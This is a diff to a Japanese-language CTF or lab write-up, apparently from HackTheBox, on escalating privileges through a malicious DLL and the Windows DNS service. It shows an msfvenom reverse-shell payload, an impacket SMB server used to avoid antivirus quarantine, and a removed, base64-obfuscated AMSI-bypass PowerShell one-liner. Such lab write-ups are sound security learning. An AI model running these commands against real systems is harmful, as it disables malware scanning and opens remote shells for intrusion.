@@ -64,6 +64,8 @@ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f 
 
 #### rev.dllがあるディレクトリでsmbサーバを立てる：
 
+（DLLをアップロードすると検疫されてしまうのでその対策）
+
 ```
 sudo impacket-smbserver kali ./
 or
@@ -94,13 +96,3 @@ or
 
 *Evil-WinRM* PS C:\Users\ryan> sc.exe start dns
 ```
-
-（AMSIのバイパスについて）
-
-今回はAMSIによりファイルの転送がいつも通り行かなかった。次を打ち込んで解決した：
-
-```
-*Evil-WinRM* PS C:\Users\ryan> [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
-```
-
-AMSIのバイパスは**Impacketのsmbserver**で転送すればできるかも！！
